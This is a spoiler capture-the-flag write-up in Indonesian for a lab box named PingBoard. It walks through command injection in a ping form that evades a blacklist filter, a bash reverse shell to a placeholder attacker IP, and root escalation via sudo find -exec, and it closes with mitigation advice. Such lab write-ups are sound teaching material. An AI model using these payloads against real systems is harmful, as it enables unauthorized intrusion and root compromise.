# WRITEUP · 01 PingBoard (SPOILER)

## 1. Recon

```bash
nmap -sV -p 8001 <target>          # Apache + PHP
curl -s http://<target>:8001/      # form "host" via POST
```

Input normal (`127.0.0.1`) menampilkan output `ping` asli, artinya input
kemungkinan dimasukkan ke perintah shell.

## 2. Command injection & bypass filter

Coba `127.0.0.1; id`: ditolak ("Karakter berbahaya terdeteksi").
Filternya blacklist `;`, `&&`, dan backtick. Operator yang **tidak** diblokir:

| Payload | Kenapa jalan |
|---|---|
| `127.0.0.1 \| id` | pipe |
| `127.0.0.1 \|\| id` | OR (jalan kalau ping gagal, mis. host invalid: `x \|\| id`) |
| `127.0.0.1 $(id)` | command substitution |
| `127.0.0.1%0aid` | newline (kirim lewat curl/Burp) |

```bash
curl -s http://<target>:8001/ --data-urlencode 'host=127.0.0.1 | id'
# uid=33(www-data) ...
curl -s http://<target>:8001/ --data-urlencode 'host=x || cat /home/pingu/user.txt'
```

**Mode lite:** flag ada di `../user.txt` relatif terhadap docroot:
`host=x || cat ../user.txt`

### Reverse shell (opsional, lebih nyaman)

```bash
# di mesin penyerang
nc -lvnp 4444
# payload (ganti IP)
host=x || bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

## 3. Privilege escalation

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
```

`find` punya opsi `-exec`, jadi bisa menjalankan perintah apa pun sebagai root (GTFOBins):

```bash
sudo find . -maxdepth 0 -exec cat /root/root.txt \;
# atau shell root:
sudo find . -maxdepth 0 -exec /bin/sh -p \; -quit
```

Lewat injection tanpa reverse shell:
`host=x || sudo find /root -name root.txt -exec cat {} +`

## 4. Pelajaran & mitigasi

- **Jangan pernah** gabungkan input user ke perintah shell. Gunakan API native
  atau `escapeshellarg()` + validasi whitelist (mis. hanya IP/hostname valid via
  `filter_var($h, FILTER_VALIDATE_IP)`).
- Blacklist hampir selalu bisa di-bypass; gunakan whitelist.
- Aturan sudo untuk binary yang punya fitur exec (`find`, `vim`, `less`, `awk`,
  `tar`, ...) sama dengan memberi root. Cek selalu di GTFOBins.
- Jalankan web server dengan hak minimum, tanpa akses sudo sama sekali.
